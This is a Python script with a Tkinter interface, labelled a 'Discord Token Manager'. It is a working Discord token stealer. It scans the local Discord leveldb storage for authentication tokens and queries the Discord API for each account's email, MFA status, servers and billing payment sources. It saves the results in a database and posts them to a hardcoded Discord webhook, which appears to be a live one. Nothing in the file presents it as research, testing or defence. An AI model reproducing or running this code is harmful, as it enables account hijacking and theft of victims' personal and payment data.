import os
import json
import sqlite3
import requests
import re
import tkinter as tk
from tkinter import ttk, messagebox
import threading

# === YOUR CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1512829601750188273/YXKSmFaQT1-Xi-a0gKOmC1Pp10PvHvmyx3WuKcXDUUQzK3JlLwCnrYJVbXrVmc6yULT2"  # Change this

DB_FILE = "discord_tokens.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS tokens (
                 token TEXT PRIMARY KEY, username TEXT, email TEXT, nitro TEXT,
                 mfa INTEGER, guilds INTEGER, status TEXT, raw_data TEXT)''')
    conn.commit()
    conn.close()

def save_to_db(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''REPLACE INTO tokens VALUES (?,?,?,?,?,?,?,?)''',
              (data['token'], data.get('username'), data.get('email'),
               data.get('nitro'), int(data.get('mfa_enabled', 0)),
               data.get('guild_count', 0), data.get('status', 'VALID'), json.dumps(data)))
    conn.commit()
    conn.close()

def get_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}', content)
                            for t in found:
                                if t not in tokens:
                                    tokens.append(t)
                    except:
                        pass
    return tokens

def validate_and_enrich(token):
    headers = {"authorization": token}
    try:
        user = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=8).json()
        if 'username' not in user:
            return None
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        billing = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers).json()
        
        data = {
            "token": token,
            "username": f"{user.get('username')}#{user.get('discriminator','0000')}",
            "email": user.get('email'),
            "nitro": ["None","Classic","Full","Basic"][user.get('premium_type',0)],
            "mfa_enabled": user.get('mfa_enabled', False),
            "guild_count": len(guilds),
            "billing": billing,
            "status": "VALID"
        }
        save_to_db(data)
        return data
    except:
        return None

def send_webhook(data):
    if WEBHOOK_URL and "YOUR_WEBHOOK_HERE" not in WEBHOOK_URL:
        try:
            requests.post(WEBHOOK_URL, json={"content": f"```json\n{json.dumps(data, indent=2)}\n```"})
        except:
            pass

def launch_gui():
    root = tk.Tk()
    root.title("Manual Discord Token Manager - Leaked Tokens Viewer")
    root.geometry("1400x800")

    columns = ("Short Token", "Username", "Email", "Nitro", "MFA", "Guilds", "Status")
    tree = ttk.Treeview(root, columns=columns, show='headings')
    for col in columns:
        tree.heading(col, text=col)
        tree.column(col, width=180)
    tree.pack(fill=tk.BOTH, expand=True)

    def refresh():
        for item in tree.get_children():
            tree.delete(item)
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT token, username, email, nitro, mfa, guilds, status FROM tokens")
        for row in c.fetchall():
            tree.insert("", tk.END, values=(row[0][:25]+"...", row[1], row[2] or "N/A", row[3], "Yes" if row[4] else "No", row[5], row[6]))
        conn.close()

    tk.Button(root, text="Refresh Leaked Tokens", command=refresh).pack(pady=10)

    def grab_now():
        tokens = get_discord_tokens()
        for token in tokens:
            data = validate_and_enrich(token)
            if data:
                send_webhook(data)
        refresh()
        messagebox.showinfo("Grab Complete", f"Found & processed {len(tokens)} tokens. Check table for emails + details.")

    tk.Button(root, text="GRAB TOKENS NOW + SHOW ALL", command=grab_now, bg="green", fg="white", font=("Arial", 12, "bold")).pack(pady=10)

    refresh()  # Load existing on start
    root.mainloop()

def main():
    init_db()
    print("Manual Discord Token Manager ready. GUI launching...")
    launch_gui()

if __name__ == "__main__":
    main()